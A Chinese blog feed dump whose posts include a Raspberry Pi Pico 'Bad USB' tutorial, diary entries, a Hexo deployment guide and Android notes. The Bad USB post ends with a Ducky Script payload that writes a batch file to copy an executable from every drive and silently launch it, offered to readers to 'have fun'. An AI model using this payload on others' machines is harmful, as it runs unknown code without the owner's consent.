src="/Blackcat-loveBlog/png/ShuMei.jpg"></p><p>需要准备一根数据线，插入后连接电脑，如果你的买的是安卓线，则需要四芯的，否则供电不足可能无法打开。</p><p>我买的是Type-C，插入后还是没有反应。</p><p>打开设备管理器，发现没有识别到未知设备，但是多了几个串口。</p><p>通过查看客服发送的连接教程，发现老师也遇到了同样的情况，这种情况通过自己安装驱动，来完成电脑对设备的识别。</p><p>但这是可以识别到未知设备，但没有在我的电脑里显示到设备时候的做法，我只能显示串口，所以我通过长按固件的Bootsel按钮，然后插入电脑，这样就可以显示出来设备了。</p><p>下载好提供的资料</p><p>首先刷入固件，将adafruit-circuitpython-raspberry_pi_pico-en_US-8.0.0.uf2 粘贴到固件内</p><p>然后固件断开，重连</p><p>将Bad USB复制到固件内，出现是否覆盖选择对</p><p>成功后，通过修改pauload.dd来实现插入Usb后自动操作的内容</p><p>关于Ducky Script的脚本和语法可以参考另一篇文章，这里我直接粘贴过来当然也可以访问原文章</p><p><a href="https://www.bilibili.com/read/cv5472965/?from=search&amp;spm_id_from=333.337.0.0">Ducky Script的脚本和语法</a></p><p>GUI                       windows菜单键</p><p>WINDOWS           windows菜单键</p><p>SHIFT                    shift键</p><p>ALT                      Alt键</p><p>CONTROL            Ctrl键</p><p>CTRL                    Ctrl键</p><p>DOWNARROW     下箭头</p><p>DOWN                 下箭头</p><p>LEFTARROW         左箭头</p><p>LEFT                     左箭头</p><p>RIGHTARROW      右箭头</p><p>RIGHT                   右箭头</p><p>UPARROW            上箭头</p><p>UP                        上箭头</p><p>BREAK                 Pause键</p><p>PAUSE                 和上一个是一样的</p><p>CAPSLOCK           大写键</p><p>DELETE                删除键</p><p>END                     END键，我估计你们不常用这个</p><p>ESC                      键盘上左上角的键</p><p>ESCAPE                键盘上左上角的键</p><p>HOME                 Home键</p><p>INSERT                 Insert键</p><p>NUMLOCK           键盘锁键</p><p>PAGEUP               上翻页键</p><p>PAGEDOWN         下翻页键</p><p>PRINTSCREEN      屏幕截屏键</p><p>SCROLLLOCK       话说不写文档我都想不起键盘上还有这个键，Scrolllock键</p><p>SPACE                 空格键，如果你延时把握的好，你甚至可以用这个指令玩炫舞</p><p>TAB                      就是Tab键咯</p><p>REPEAT是一个很特殊指令，将下面的语句重复多少遍，举个例子。</p><p>REPEAT 100</p><p>STRING Hello World！</p><p>以上的代码块就是输出Hello World！这条语句一百次，无情的打字机器，对吧。</p><p>说点题外话，我这两天拍的教程中的设备，USB Ninja Pro还在以上基础上添加了一些功能，也就是几个新的脚本指令。我在这里也介绍下。</p><p>USBON             切换到Ninja的USB口，原本通道关闭</p><p>USBOFF            切换至原来的USB口，关闭Ninja的USB通道</p><p>CAPSLOCK ON 大写锁定，使用之后，保证电脑一直在大写锁定态</p><p>CAPSLOCK OFF 大写锁定关，保证电脑在非大写锁定态</p><p>PLUGAUTORUN 后面跟数字，下一次插入直接运行数字对应的SLOT里面存储的脚本</p><p>MSCREAD         手动将ROM里面的数据加载到RAM，也就是挂载U盘操作</p><p>MSCSAVE          手动将RAM里面的数据加载到ROM，也就是断开并保持U盘内容</p><p>MSCWIPE          擦除ROM盘里面的数据</p><p>MSCFORM        格式化ROM盘中的数据</p><p>MSCONOFF      后跟参数0或者1，为1时U盘功能启动</p><p>举个完整的例子吧。</p><p>REM This is a script to download and change the wallpaper in windows 10</p><p>REM In order to work, windows must be using the default app for opening photos</p><p>以上两句是注释行</p><p>DELAY 5000                </p><p>延时5000ms，也就是五秒</p><p>CONTROL ESCAPE</p><p>Ctrl键加Esc键</p><p>DELAY 100</p><p>延时100ms</p><p>REM Note: The internet explorer method works usually for everyone but</p><p>REM If you want to use Chrome or Firefox instead of IE, remove ‘iexplorer’ from the following line</p><p>REM but also make sure to follow instructions bellow</p><p>又是三行注释</p><p>STRING iexplore <a href="http://www.thecuriosityworkshop.com/wp-content/uploads/2015/03/01-rubberduck-hongkong.jpg">http://www.thecuriosityworkshop.com/wp-content/uploads/2015/03/01-rubberduck-hongkong.jpg</a></p><p>使用ie打开一个网址</p><p>ENTER</p><p>回车</p><p>DELAY 4000</p><p>延时4秒</p><p>CONTROL s</p><p>Ctrl键加s键，也就是保存了</p><p>DELAY 2000</p><p>延时</p><p>ENTER</p><p>回车</p><p>DELAY 300</p><p>延时</p><p>CONTROL ESCAPE</p><p>Ctrl加ESC键</p><p>DELAY 300</p><p>延时</p><p>REM If you want to use Chrome, change ‘Documents’ to ‘Downloads’</p><p>REM If you want to use Firefox, change ‘Documents’ to ‘Pictures’</p><p>注释</p><p>STRING %USERPROFILE%\Documents\01-rubberduck-hongkong.jpg</p><p>输入了一条指令</p><p>DELAY 500</p><p>ENTER</p><p>DELAY 500</p><p>TAB</p><p>DELAY 500</p><p>TAB</p><p>DELAY 500</p><p>TAB</p><p>DELAY 500</p><p>TAB</p><p>DELAY 500</p><p>TAB</p><p>DELAY 500</p><p>TAB</p><p>DELAY 500</p><p>TAB</p><p>DELAY 500</p><p>ENTER</p><p>DELAY 500</p><p>DOWN</p><p>DELAY 500</p><p>DOWN</p><p>DELAY 500</p><p>DOWN</p><p>DELAY 500</p><p>DOWN</p><p>DELAY 500</p><p>ENTER</p><p>DELAY 500</p><p>DOWN</p><p>DELAY 500</p><p>DOWN</p><p>DELAY 500</p><p>ENTER</p><p>DELAY 500</p><p>后面就是模拟键盘进行了一系列的选择了，最终，你的壁纸会被替换为上面网址中的图片。</p><p>我这里也放一段脚本，推荐你们自行理解并使用</p><p>MSCREAD</p><p>USBON</p><p>CAPSloCk On</p><p>GUI r</p><p>DELAY 500</p><p>STRING cmd /c echo “cmd /c ping 127.0.0.1 &gt; nul &amp;&amp; for %%i in (A B C D E F G H I J K) do copy %%i:\fuck.exe %USERPROFILE%\Desktop\fuck.exe &amp;&amp; start %USERPROFILE%\Desktop\fuvk.exe” &gt; %Temp%\a.bat &amp;&amp; %Temp%\a.bat</p><p>ENTER</p><p>CAPSloCk Off</p><p>DELAY 5000</p><p>REPEAT 2</p><p>USBOFF</p><p>玩的开心XD </p><p>作者：无序熵增 <a href="https://www.bilibili.com/read/cv5472965/?from=search&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/read/cv5472965/?from=search&amp;spm_id_from=333.337.0.0</a> 出处：bilibili</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最近感到很焦虑</title>
      <link href="/NANABLOG/2024/05/28/%E6%9C%80%E8%BF%91%E6%84%9F%E5%88%B0%E5%BE%88%E7%84%A6%E8%99%91/"/>
      <url>/NANABLOG/2024/05/28/%E6%9C%80%E8%BF%91%E6%84%9F%E5%88%B0%E5%BE%88%E7%84%A6%E8%99%91/</url>
      
        <content type="html"><![CDATA[<p>最近我总是感到很焦虑，虽然平常也总是时不时的有这样的感受，但这几天真的不一样，这种压抑的感觉让我无法呼吸，有时候我会想，给自己找一份工作！不要闲着了，或者是 年轻有资本，快去做些什么，不然以后就会很后悔。</p><p>但对我来说，我害怕失败，我和所有底层人一样，经历不起失败，一旦做出选择，或者是错误的选择，就意味着未来几十年的买单。</p><p>我该如何保护我的家人，我该如何才能够追上他们老去的速度。</p><p>我想要成功，甚至我自己都不在乎，我只希望，能够带着自己的家人，离开贫苦，再最后的日子里平安，自由，享受生活。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[2024]hexo部署静态博客到Github教程</title>
      <link href="/NANABLOG/2024/05/11/2024-hexo%E9%83%A8%E7%BD%B2%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E5%88%B0Github%E6%95%99%E7%A8%8B/"/>
      <url>/NANABLOG/2024/05/11/2024-hexo%E9%83%A8%E7%BD%B2%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E5%88%B0Github%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>维护博客，写博客，本身就是一件有意义的事情，在这个过程中，对自己的收获最大，这就像是以前的人们写笔记，不断总结，让自己变得更好。</p><p>一开始总是会感到迷茫，不知道写什么，我觉得任何你想要分享的内容都可以，给他人带来启发，亦或者帮助他人解答困惑。</p><p>如果你未来或者现在已经打算从事互联网相关的行业，那么博客必然能为你带来更多的帮助，总结自己的技术，既能够让自己理解更加深刻，再忘记的时候也能快速找到，这种不断构建属于自己的图书馆的感觉，真的很满足。</p><p>回到主题，想要部署博客，首先需要根据自己的需求选择，目前部署的方法有两种。</p><p>第一种:gitee GitHub上的静态部署</p><p>第二种:购买服务器的动态部署</p><p>那么两种的优缺点是什么呢？</p><p>静态部署和动态部署是两种不同的部署方式，主要的区别在于如何处理和生成网页内容。</p><ul><li><strong>静态部署</strong>：在静态部署中，网站的内容在部署之前已经预先生成好，并作为静态文件存储在服务器上。当用户请求网页时，服务器直接将保存在硬盘上的静态文件返回给用户。这意味着服务器不需要动态地生成网页内容，因此可以快速且高效地响应请求。静态部署适用于那些不需要频繁更新内容的网站，例如博客、企业官网等。</li><li><strong>动态部署</strong>：与静态部署不同，动态部署是在用户请求时动态生成网页内容。当用户请求到达服务器时，服务器会根据用户的需求，从数据库、文件系统、或其他数据源中提取数据，并将其与动态网页模板结合生成最终的网页内容。这种方式允许用户获得个性化的内容，但动态生成网页的过程可能需要更多的计算资源和时间。动态部署适用于需要实时更新和交互性较强的网站，例如社交媒体、电子商务网站等。</li></ul><p>选择静态部署还是动态部署取决于网站的需求和特点。对于简单的网站，静态部署可以提供更快的响应速度和更低的服务器负载。而对于复杂的网站，可能需要动态部署来满足用户的个性化需求和实时数据更新。</p><p>本次教程是静态部署，如果需要动态部署的教程的话，可以私信我或者留言，需求大的话，我会专门购买服务器再做一个专门的教程。</p><p>如果我们的目标只是编写文章发布的话，静态已经能满足大多数人了，倘若你对于博客有更高的要求可以选择购买服务器。</p><p>静态部署博客需要将博客代码上传到代码托管平台，然后按照平台规定，通过网址访问。</p><p>因为目前我做这个教程的时候gitee的托管服务在维护，所以这里使用github演示，当然你可以选择自己喜欢的平台。</p><p>如果要使用gitee托管，记得要提前实名认证才能使用网页托管服务，反之在github上只要注册账号就可以正常托管。</p><h1 id="1-下载Git"><a href="#1-下载Git" class="headerlink" title="1.下载Git"></a>1.下载Git</h1><p>在部署前，我们需要下载git。</p><p><a href="https://git-scm.com/">https://git-scm.com/</a></p><p>访问网址打开官网，然后下载，点击电脑上的Download for windows就可以，自动选择当前合适版本。</p><p>这时候可以看到32 64等数字，这时候需要根据电脑的位数选择，现在的电脑一般都是64位，当然如果你想要确定可以通过右键我的电脑或者此电脑，查看电脑属性，系统信息里会显示。</p><p>具体的下载教程可以查看其他人分享的教程，这里不过多赘述，直接搜索Git安装教程即可。</p><p>这里推荐一个教程:<a href="https://blog.csdn.net/mukes/article/details/115693833">https://blog.csdn.net/mukes/article/details/115693833</a></p><h1 id="2-选择静态博客工具"><a href="#2-选择静态博客工具" class="headerlink" title="2.选择静态博客工具"></a>2.选择静态博客工具</h1><p>如果之前搜过静态博客的教程，你会频繁的看到 hexo typecho hugo等等的字样，这些都是能帮你快速生成博客代码的工具，同时只要通过几个代码就能创建新的博文。</p><p>同时这些工具还包含各种各样制作的网页模板，也就是个性化，有大佬用爱发电制作的，也有官方制作的。</p><p>选择哪个都可以，这里我使用的是hexo，之前的博客就是用hexo生成的，所以这里使用它演示。</p><p>找到hexo的官方文档，查看如何使用</p><p><a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a></p><p>可以看到它让我们安装git和node.js</p><p>因为我们已经安装了git所以接下来安装node.js</p><p>这里简单介绍一下node</p><p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行时环境，用于开发服务器端和网络应用程序。Node.js 允许使用 JavaScript 编写服务器端代码，这使得前端开发人员可以使用相同的语言和技术栈来编写完整的 Web 应用程序。</p><p>Node.js 的主要特点包括：</p><ol><li>事件驱动和非阻塞 I/O 模型：Node.js 使用事件驱动的方式处理请求和响应，从而使得处理高并发请求成为可能。它也采用了非阻塞的 I/O 模型，可以在处理 I/O 操作时同时处理其他任务，提高了应用程序的性能和可伸缩性。</li><li>轻量和高效：Node.js 是一个轻量级的运行时环境，它的代码执行非常快速。这得益于底层的 V8 引擎，该引擎将 JavaScript 直接编译成本地机器码。</li><li>跨平台：Node.js 支持多个操作系统，如 Windows、Linux 和 macOS，使得开发人��可以在不同平台上构建和运行应用程序。</li><li>模块化：Node.js 提供了一个强大的模块化系统，使得开发人员可以将代码组织成可重复使用的模块。这极大地促进了代码的可维护性和可重用性。</li><li>生态系统：Node.js 拥有庞大的第三方模块和工具库，可以帮助开发人员快速构建各种类型的应用程序，包括 Web 服务器、API 服务、实时应用程序等。</li></ol><p>总的来说，Node.js 提供了一个强大的平台和工具，使得开发人员可以使用 JavaScript 来构建高性能、可伸缩的服务器端应用程序。</p><p>这里也推荐一个node安装教程文档</p><p><a href="https://blog.csdn.net/qq_60870118/article/details/129727274">https://blog.csdn.net/qq_60870118/article/details/129727274</a></p><p>安装了node后就可以使用npm去下载所需要的文件。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如果遇到了下载失败，或者卡住的情况，也请不要慌张，有时候网络是这样的。</p><p>多试几次或者通过修改国内镜像来下载。</p><h2 id="如果npm下载插件报错"><a href="#如果npm下载插件报错" class="headerlink" title="如果npm下载插件报错"></a>如果npm下载插件报错</h2><p>可是通过使用yarn add下载插件。</p><h1 id="3-创建博客"><a href="#3-创建博客" class="headerlink" title="3.创建博客"></a>3.创建博客</h1><p>使用hexo init创建Hexo工具</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo init '输入你的blog文件夹名称'</span><br></pre></td></tr></tbody></table></figure><p>打开_config.yml更改deploy</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span>     <span class="comment">#仓库链接</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br><span class="line">  <span class="attr">message:</span> <span class="string">'hello blog'</span> <span class="comment">#msg</span></span><br></pre></td></tr></tbody></table></figure><p>下载deploy插件</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></tbody></table></figure><p>创建一个新文章</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo new 'blog name'</span><br></pre></td></tr></tbody></table></figure><p>在本地渲染运行</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></tbody></table></figure><p>确保没有问题后，上传到github</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></tbody></table></figure><p>打开Settings的Pages，将Branch改为main然后save保存。</p><p>刷新等待，打开连接查看博客。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记账软件文案</title>
      <link href="/NANABLOG/2024/05/07/%E8%AE%B0%E8%B4%A6%E8%BD%AF%E4%BB%B6%E6%96%87%E6%A1%88/"/>
      <url>/NANABLOG/2024/05/07/%E8%AE%B0%E8%B4%A6%E8%BD%AF%E4%BB%B6%E6%96%87%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p>标题：耗时XXXX时间，我制作了一个记账软件……….</p><p>正如标题所说，我制作了一个记账软件，事情的起因是，刚毕业，投简历找不到工作，等待的过程非常焦虑，所以我决定将这部分时间利用起来，从零开发一个记账软件。</p><p>我开始研究了解市面上的记账软件，看了很多测评和评论，发现大家对于这类软件的喜好各有不同，有些人喜欢UI可爱的喵喵记账，有些人追求极简和好用，选择一木记账，有些人则追求性价比高的，最好是免费的钱迹。</p><p>其实我也是一个爱白嫖的人，讨厌那些乱七八糟的会员，但这是因为现在很多软件的会员收费太乱，而且交了钱也不一定能得到自己想要的结果和功能，但这不代表我呼吁白嫖，反而觉得其实会员是非常有必要存在的，自从开始开发软件，我深刻感受到软件的维护和修复成本确实很大，开发者也需要吃饭和休息，用户喜欢开发者的软件，愿意支持开发者，所以开通了会员，让开发者也有精力维护项目，这本身是一个正向循环。</p><p>这些支持真的很重要。</p><p>在开发过程中，我一直注重软件的安全性，尤其是记账的数据，我认为隐私性质还是很重要的，所以我一直想办法让数据最大程度的得到保障，在用户手中，而不是在服务器，或者是自己的手中。</p><p>存在服务器确实方便一点，在换手机的时候直接就能导入数据，但是当软件不运营的时候，你的数据又能够确保全部导出吗？我曾经看过很多人说，记了几年的账本，最后软件停止运行了，自己的数据也没成功导出，都不愿意在继续记账了。</p><p>记账本身就需要坚持，看着不断增加的数据，对我而言是继续记账的动力，因为数据越多，我越是了解自己。</p><p>所以我理解数据丢失的一瞬间心情是多么复杂，所以我认为既然就决定记账了，那么自己保护好自己的数据也并不是什么难题，保存在电脑，或者U盘并不难。</p><p>所以软件的数据是默认保存在本地的，你可以随时导出数据，进行备份，当然我推荐是一个月总结一次顺便保存一次。</p><p>当然我也会提供云保存的办法，并且会尽力维护数据安全性和完整性。</p><p>使用云保存就需要租用服务器，所以就需要缴费了，这部分费用全部用来续费服务器，如果哪一天用不起了，我也会多交两个月然后提前通知大家备份自己的数据。</p><p>其他的不能保证，但是软件本体的维护的会一直维护下去的，或许有一天做不下去了，我会将所有功能开放，然后开源本项目，让软件能够继续运行。</p><p>为什么一些功能需要收费，因为调用API本身就需要钱，不然越做越穷，其他能免费的则都免费了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文案 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电子女仆的想法</title>
      <link href="/NANABLOG/2024/05/03/%E7%94%B5%E5%AD%90%E5%A5%B3%E4%BB%86%E7%9A%84%E6%83%B3%E6%B3%95/"/>
      <url>/NANABLOG/2024/05/03/%E7%94%B5%E5%AD%90%E5%A5%B3%E4%BB%86%E7%9A%84%E6%83%B3%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>x</p><p>记得在小时候，看过一个动漫叫做《樱花庄的宠物女孩》，剧情我其实已经忘记的差不多了，但是我对里面的一个角色却依然有印象，那是我小时候梦寐以求的技术，就是龙之介自己做的电子女仆，龙之介是一个大佬级别的技术宅，不喜欢交流，所以一切交流都是他制作的电子女仆来做。女仆不但可以黑入他人设备，还能照顾主人。</p><p>自从那时候开始，我就是不是关注这种居家AI的技术，以前人们都是觉得，需要输出大量指令才可以，因为机器不会联想，所以不断进行判断设想，我还记得最早的电脑女仆是用cmd写的。</p><p>当时就是输出不同的指令来帮助你完成一些事情，即使是聊天，也是检索关键字然后设置好回复词。</p><p>智能家居也是如此，但是现在随着Ai的发展，真正的联想AI也并不是不可能。</p><p>只要设定好有足够逻辑的代码，就可以自己判断然后实现联想。</p><p>比如，我设想，如果在板凳上安装一个感应器，每次坐上后，AI知道我到电脑桌前，然后我每次打开电脑做的一切都会被记录，AI会寻找我每次都会打开的软件，这样长久以来就掌握了我的习惯，然后AI会自己判断，一开始每次会问我，需要打开xxx软件吗，到最后只要判断值达到100%,直接认定我肯定会打开，所以写脚本，每次直接打开软件这样。</p><p>逻辑是这样的，依靠这个逻辑，可以完成更多的事情，到最后形成一套我认为电子女仆最佳的LLM语言模型和记忆库。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 点子 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>养家好幸苦企划</title>
      <link href="/NANABLOG/2024/04/24/%E5%85%BB%E5%AE%B6%E5%A5%BD%E5%B9%B8%E8%8B%A6%E4%BC%81%E5%88%92/"/>
      <url>/NANABLOG/2024/04/24/%E5%85%BB%E5%AE%B6%E5%A5%BD%E5%B9%B8%E8%8B%A6%E4%BC%81%E5%88%92/</url>
      
        <content type="html"><![CDATA[<p>一款简单的肉鸽卡牌类型单机手游</p><p>构思来源：</p><p>来源于我之前做的一个梦，在梦里，体会到了男生养家的幸苦和幸福，灵感也来源于我之前看的一个视频，大概讲的是一个男人从一开始的破破烂烂的门进去，里面是妻子抱着小孩，到后面门不断变好，家也越来越新，孩子和妻子也越来越可爱漂亮，每次进家里，都是温馨的。</p><p>所以我想做一个男人在外面拼搏，然后回到家给妻子和孩子买东西，的故事。</p><p>详细构思：</p><p>游戏的算法结构我想参考60s，一切的随机性比较高，比如玩家操控丈夫回来后，有几率妻子心疼丈夫也要出去打工，或者带来一些财富，比如路上捡了200块，今天帮忙发传单赚了100等等，有很多的随机事件，只要条件达成就可以触发，关于丈夫的工作，我想划分为技术类的和肝类型的，当然也可以选择快乐抽卡类。</p><p>目前我希望做出两个结局，第一个成功养家，Happy END，或者是流落街头的 Bad END。</p><p>男子出去的打工都是一些简单益智小游戏。</p><p>回到家就可以看到漂亮的妻子和可爱的孩子，然后家里破破烂烂。</p><p>就这样不断升级直到达到美好结局。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>心情日记</title>
      <link href="/NANABLOG/2024/04/18/%E5%BF%83%E6%83%85%E6%97%A5%E8%AE%B0/"/>
      <url>/NANABLOG/2024/04/18/%E5%BF%83%E6%83%85%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>2024.4.18</p><p>从今天开始我将一些自己的感悟在这里以日记的形式写出来，写日记这个习惯其实早几年我已经有了，但内容不够聚合，总是在手机上写一点，随身记写一点，有时候在自己正在写的书中也会写，没有一个很好保存这些想法的地方，现在发掘或许blog是个好地方，作为公开的笔记，我肯定是希望有人可以看到，但我对自己的blog几乎没有宣传，目前我也不想宣传，作为记录我学习技术的博客，我深知自己的内容不够吸引人。</p><p>最近这段时间我很焦虑，作为刚出炉的社会人，到底该做些什么，这些迷茫或许是每个努力进取的年轻人都会有的烦恼，自古都是。</p><p>但对我来说，不是找个工作，天天上好班就是完美，我家里的条件不是很好，并且有一些债务，这对我来说很有压力，如果去工作，按照我们这个地区的工资水准， 我可能努力20年才能够还完债务，所以去工作，不是算作计划，只能作为一个开始，我阅读过很多本关于资本，银行，经济的书籍，试图从这些知识中找到一条新的道路，所有箭头都指向一个行为，创业。</p><p>创业，就像是社会杀手，筛选着不合格的人，筛选着那些梦想家，普通人想要累计资本，几乎是不可能的事情，富人的机会比穷人多，并不是空谈。所以对现在的我来说，我还处在累计资本的过程中，即使路途艰险，我依然会继续，即使失败，也就是从头再来罢了，现在的我对人生的看法就是滚雪球，刚开始的时候总是很难，但一旦累计到一定程度，雪球就会自己向前走了。</p><p>2024.4.29</p><p>我几乎每天都会做梦，每次起床都会会回想梦境，试图寻找出一条道路，但一切皆是虚幻，即使梦中的故事多么精彩和美好，亦或者残酷和恐惧，最后随着醒来都烟消云散。</p><p>我是不是太过于焦虑了，像我这样的人，丢失了安全感就如同丢失了命，失了魂，所以我不想放弃任何机会，年轻是资本，但不代表资本就可以随意流失，如何在有限的生命里，成就无限的成绩，成了我夜以继日，每时每刻都在思考的问题，如何前进？如何把握机会？如何在一切还没有到无法挽回的地步的时候做好准备？</p><p>我不知道，即使一切都计划好了，我也要说一句，我不知道。</p><p>最近身边为数不多的朋友，有一位朋友听说要轻生，那一个晚上我寝食难安，担心他是一回事，同时让我获得了大思考，对自己的处境也有了新的感悟，未来的事情我不清楚，但是我直到，如何我在这样下去，我也会萌生一样的想法，在这个大环境下，我们无一避免。</p><p>2024.5.19</p><p>我一直在寻找到底如何才能够打破秘境，拿到真正的宝藏，但我随着不断的思考和探究，我始终觉得我所看到的一切，都太浅了，自以为看到了深层之下，但其实还是浮于表面，这不是它本身的高度问题，而是不同维度的问题，看到看不见的东西，不止看到本身，还要感受到，其他维度的化学反应。</p><p>2024.9.14</p><p>我的人生充满了迷茫无助和痛苦，我每天都是如此的自我矛盾，我好孤独，闭上眼睛，我最想念的那段时光，和我的朋友们，那时候我感觉他们是如此可靠，现在他们还在，但已经不是我心中的人儿了，或许是他们变了，也或许是我变了，我们已经无法相融了，但这些回忆会永远陪着我，闭上眼睛，我还能看到我的朋友们，他们在“我的世界”里，微笑着看着我，即使这是我的幻想也无所谓了，未来很多人会进入我的回忆中，给予我前进的动力，他们也只存在于回忆中，陪我活着，陪我死去</p><p>2024.9.15</p><p>在这个世界上，我们总是需要一个归属地，这不是我们在现实中的家，而是精神上的归属，就如同现实中我们和父母一起生活，在游戏中同伴显得更加重要，不过很明显如果只是游戏带给对我来说带给我的归属感远远不够，我更加渴望一个冷静，理性，包容，自由，同时又温度的社区，它可能不需要很多人，但每个人在其中都有位置，而且总是愿意为社群做出贡献的，这样的感觉是如此的好，未来我会努力创造一个，大家都喜欢的小世界，在那里或许能够得到救赎与爱。</p><p>2024.9.19</p><p>我终于理解到了什么是钻牛角尖，以及那句经典的话，当你感到迷茫，痛苦的时候不妨后退一步，当你身处环境，你不断挑刺的时候，你会发现很多你无法接受的点，然后你会崩溃，你努力解决却无济于事，开始抱怨和反复压力，这时候适当的松口，不必咬紧牙关，因为这样反而无法理性思考，就这样，深呼吸，松口，适当的后退，然后想办法解决问题，而不是抱怨现状和陷入那接近偏执。</p><p>2024.9.25</p><p>我最近很悲伤，曾经的那些计划看起来是如此的不成熟和可靠，我意识到了这就是现实和梦想的差距，幻想的时候感觉一切都理你很近，虽然看起来合理，但你没有亲身去体验实现过程的那些痛苦，所以认为很近，实际上那些痛苦已经是很大的距离了。</p><p>我不会在像以前那样小看这个世界，那些不曾注意到的细节，才是让我们需要谦逊下来，慢慢学习的东西</p><p>2024.10.6</p><p>如果经济情况不好的话，点外卖感觉是一个既伤害身体，又浪费钱的选择，这两天因为我妈不在家，给我留了五十块钱，在我点了两次外面后得出了这个结论，第一餐是华莱士套餐，感觉还好，第二餐是四海的心肝宝贝煲仔，没吃完扔了，刚刚又下去买了泡面，没吃完扔了，感觉很难吃，我估计我再不会吃泡面了。</p><p>现在一吃泡面就想吐，在这样的情况下，还不如自己买点鸡蛋，煮点米饭，然后蛋炒饭好。所以基于两次的教训，我决定之后避免在家里点外卖，偶尔的情况还好，但是这两次吃的真的有够难受的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 开发学习笔记</title>
      <link href="/NANABLOG/2024/04/16/Android-%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/04/16/Android-%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>本文档使用集成开发环境IDEA学习</p><p>官方下载：<a href="https://developer.android.com/?hl=zh-cn">https://developer.android.com/?hl=zh-cn</a></p><h1 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h1><p>1.点击新建项目（new project）选择需要的模板工程文件</p><p>2.下一步后更改工程文件相关说明</p><p>Name（名字）</p><p>Package name （包名）</p><p>Save location （保存位置）</p><p>Langeuage （项目语言） 本项目使用的是JAVA语言</p><p>Minimum SDK (最低支持系统) tip:意味着你当前的开发最低支持你选择的系统版本，比如Android 7，这样低于这个系统版本的手机将无法使用此APK</p><p>Build configuration language （构建配置语言） tip:推荐默认</p><h2 id="等待下载"><a href="#等待下载" class="headerlink" title="等待下载"></a>等待下载</h2><p>创建完成项目后，需要等待相关文件的下载比如gradle（构建工具）的下载，如果遇到下载慢的情况可以通过修改gradle来源来解决</p><h4 id="①-修改Gradle来源"><a href="#①-修改Gradle来源" class="headerlink" title="① 修改Gradle来源"></a><strong>① 修改Gradle来源</strong></h4><p>在项目的<code>gradle/wrapper/gradle-wrapper.properties</code>这个文件中可以看到配置：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">distributionBase=GRADLE_USER_HOME</span><br><span class="line">distributionPath=wrapper/dists</span><br><span class="line">zipStoreBase=GRADLE_USER_HOME</span><br><span class="line">zipStorePath=wrapper/dists</span><br><span class="line">distributionUrl=http\://services.gradle.org/distributions/gradle-6.5-all.zip</span><br></pre></td></tr></tbody></table></figure><p>其中<code>distributionUrl</code>指定了Gradle发行版的地址，而这个<code>http://services.gradle.org/distributions/gradle-6.5-all.zip</code>访问起来是很慢的；</p><p>所以我们修改这个配置即可；</p><p>可以将其修改为国内的一个源，如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">distributionUrl=https\://code.aliyun.com/kar/gradle-all-zip/raw/master/gradle-6.5-all.zip</span><br></pre></td></tr></tbody></table></figure><p>在这里提供了Gradle 6.x的阿里云地址：</p><ul><li><a href="https://www.kagura.me/dev/20200828131600.html">国内借助阿里云CDN快速下载Gradle 6.x zip安装包</a></li></ul><p>但其实在2019年3月，<strong>Gradle开启了在中国地区的CDN，下载Gradle的distribution已经不需要翻墙！</strong></p><p>修改gradle文件夹下面的gradle-wrapper.properties中的<code>http://services.gradle.org</code>为：</p><p><strong><code>http://downloads.gradle-dn.com</code></strong></p><p>即可！</p><blockquote><p><strong>但是经过我实测，<code>http://downloads.gradle-dn.com</code>的下载速度还是不太行……，所以还是推荐使用阿里云的CDN的方法！</strong></p></blockquote><h4 id="②-手动下载Gradle"><a href="#②-手动下载Gradle" class="headerlink" title="② 手动下载Gradle"></a><strong>② 手动下载Gradle</strong></h4><p>在项目的<code>gradle/wrapper/gradle-wrapper.properties</code>这个文件中可以看到配置：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span 